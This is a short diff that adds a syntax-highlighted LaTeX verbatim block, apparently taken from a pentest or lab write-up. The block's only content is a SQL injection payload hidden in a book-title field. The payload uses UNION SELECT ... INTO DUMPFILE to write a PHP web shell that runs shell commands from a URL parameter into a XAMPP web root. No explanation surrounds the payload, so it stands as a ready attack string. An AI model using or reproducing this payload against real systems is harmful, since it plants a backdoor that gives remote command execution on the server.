@@ -1,0 +1,3 @@
+\begin{Verbatim}[commandchars=\\\{\}]
+\PYG{n}{Libro} \PYG{n}{de} \PYG{n}{prueba} \PYG{l+m+mi}{3}\PYG{l+s+s1}{\PYGZsq{} union SELECT 1,2,3,4, \PYGZsq{}}\PYG{err}{\PYGZbs{}}\PYG{n}{n}\PYG{o}{\PYGZlt{}?}\PYG{n}{php} \PYG{n}{echo} \PYG{n}{shell\PYGZus{}exec}\PYG{p}{(}\PYG{err}{\PYGZdl{}}\PYG{n}{\PYGZus{}GET}\PYG{p}{[}\PYG{l+s+s1}{\PYGZsq{}\PYGZsq{}}\PYG{n}{cmd}\PYG{l+s+s1}{\PYGZsq{}\PYGZsq{}}\PYG{p}{]);} \PYG{o}{?\PYGZgt{}}\PYG{l+s+s1}{\PYGZsq{} INTO dumpfile \PYGZsq{}}\PYG{k}{C}\PYG{p}{:}\PYG{o}{/}\PYG{n}{xampp}\PYG{o}{/}\PYG{n}{htdocs}\PYG{o}{/}\PYG{n}{enwi}\PYG{o}{/}\PYG{n}{test}\PYG{p}{.}\PYG{n}{php}\PYG{err}{\PYGZsq{}} \PYG{c+c1}{\PYGZhy{}\PYGZhy{}}
+\end{Verbatim}
